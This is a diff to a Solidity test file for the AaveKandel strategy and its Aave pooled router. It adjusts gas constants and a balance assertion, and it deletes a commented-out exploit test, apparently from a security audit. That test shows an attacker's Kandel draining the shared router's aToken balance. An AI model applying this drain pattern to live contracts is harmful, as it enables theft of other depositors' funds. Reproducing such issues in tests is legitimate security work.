@@ -46,8 +46,8 @@ contract AaveKandelTest is CoreKandelTest {
   function __deployKandel__(address deployer, address id) internal virtual override returns (GeometricKandel) {
     // 474_000 theoretical in mock up of router
     // 218_000 observed in tests of router
-    uint router_gasreq = 318 * 1000;
-    uint kandel_gasreq = 338 * 1000;
+    uint router_gasreq = 500 * 1000;
+    uint kandel_gasreq = 160 * 1000;
     router = address(router) == address(0) ? new AavePooledRouter(aave, router_gasreq) : router;
     AaveKandel aaveKandel_ = new AaveKandel({
       mgv: IMangrove($(mgv)),
@@ -156,7 +156,7 @@ contract AaveKandelTest is CoreKandelTest {
     uint quoteAave = router.overlying(quote).balanceOf(address(router));
     vm.prank($(mgv));
     kdl.makerPosthook(order, result);
-    assertApproxEqAbs(kdl.reserveBalance(Bid), makerBalance + 1000 * 10 ** 6, 1, "Incorrect updated balance");
+    assertApproxEqAbs(kdl.reserveBalance(Bid), makerBalance, 1, "Maker balance should be invariant");
     assertEq(base.balanceOf(address(router)), 0, "Router did not flush base buffer");
     assertEq(quote.balanceOf(address(router)), 0, "Router did not flush quote buffer");
     assertEq(
@@ -394,33 +394,4 @@ contract AaveKandelTest is CoreKandelTest {
       reserveId: address(0)
     });
   }
-
-  //   function test_chainsec_attack() public {
-  //     AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
-  //     AaveKandel attackKandel = AaveKandel(payable(__deployKandel__(address(attacker), address(0))));
-
-  //     deal($(base), address(attacker), 1);
-  //     attacker.approveLender(base);
-  //     attacker.supply(base, 1);
-  //     IERC20 atoken = attacker.overlying(base);
-  //     console.log("router's aWETHs before attack", atoken.balanceOf(address(router)));
-
-  //     vm.startPrank(address(attacker));
-  //     // allows attacker to deposit aWETHS on its Kandel strat
-  //     atoken.approve({spender: address(attackKandel), amount: type(uint).max});
-  //     // allows attackKandel to push aWETHs to the router
-  //     attackKandel.approve(IERC20(atoken), address(router), type(uint).max);
-  //     attackKandel.depositFunds(dynamic([IERC20(atoken)]), dynamic([uint(1)]));
-  //     vm.stopPrank();
-
-  //     console.log("router's aWETHs after deposit", atoken.balanceOf(address(router)));
-
-  //     vm.startPrank(address(attacker));
-  //     attackKandel.withdrawFunds(
-  //       dynamic([IERC20(atoken)]), dynamic([uint(atoken.balanceOf(address(router)))]), address(attacker)
-  //     );
-  //     vm.stopPrank();
-  //     assertEq(atoken.balanceOf(address(router)), 0, "Attack failed");
-  //     console.log("router's aWETHs after attack", atoken.balanceOf(address(router)));
-  //   }
 }
